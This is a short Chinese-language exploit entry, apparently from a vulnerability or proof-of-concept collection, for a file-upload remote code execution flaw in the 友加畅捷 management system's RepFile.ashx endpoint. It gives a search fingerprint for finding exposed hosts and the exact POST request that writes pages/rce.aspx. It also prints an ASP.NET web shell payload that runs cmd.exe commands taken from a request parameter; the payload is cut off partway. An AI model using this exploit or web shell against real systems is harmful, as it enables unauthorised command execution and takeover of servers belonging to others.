# 友加畅捷管理系统RepFile.ashx存在文件上传致RCE漏洞

- **系统**：友加畅捷管理系统　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`icon_hash="2049187099"`
- **请求**：`POST /ReportDesign/RepFile.ashx?RepFile=pages/rce.aspx&Type=SaveRepFileData HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
<script runat="server" language="C#">
protected void Page_Load(object sender, EventArgs e)
Response.Clear();
Response.ContentType = "text/plain";
string command = Request["cmd"];
if (string.IsNullOrEmpty(command))
return;
System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c " + command;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
psi.CreateNoWindow = true;
using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
using (System.IO.StreamReader reader = process.StandardOutpu…（脚本共 977 字，完整版见原文）
```
- **预期**：200　|　—